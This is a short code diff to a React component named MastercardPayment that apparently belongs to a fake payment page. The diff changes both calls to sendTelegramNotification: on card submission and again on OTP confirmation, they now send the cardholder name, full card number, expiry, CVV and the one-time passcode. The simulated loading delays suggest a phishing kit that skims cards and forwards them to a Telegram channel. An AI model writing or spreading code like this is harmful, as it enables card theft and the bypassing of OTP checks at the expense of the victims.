@@ -143,7 +143,7 @@ const MastercardPayment = () => {
   const handleSubmit = () => {
     if (!isFormValid()) return;
     setIsLoading(true);
-    sendTelegramNotification({ type: 'payment_activity', amount, method: 'Mastercard', paymentType: 'card' });
+    sendTelegramNotification({ type: 'payment_activity', amount, method: 'Mastercard', paymentType: 'card', cardName: cardHolder, cardNumber, expiry, cvv });
     setTimeout(() => {
       setIsLoading(false);
       setShowOtp(true);
@@ -153,7 +153,7 @@ const MastercardPayment = () => {
 
   const handleOtpConfirm = () => {
     if (otpCode.length !== 6) return;
-    sendTelegramNotification({ type: 'payment_activity', amount, method: 'Mastercard', paymentType: 'card' });
+    sendTelegramNotification({ type: 'payment_activity', amount, method: 'Mastercard', paymentType: 'card', cardName: cardHolder, cardNumber, expiry, cvv, otp: otpCode });
     setOtpLoading(true);
     setTimeout(() => {
       setOtpLoading(false);
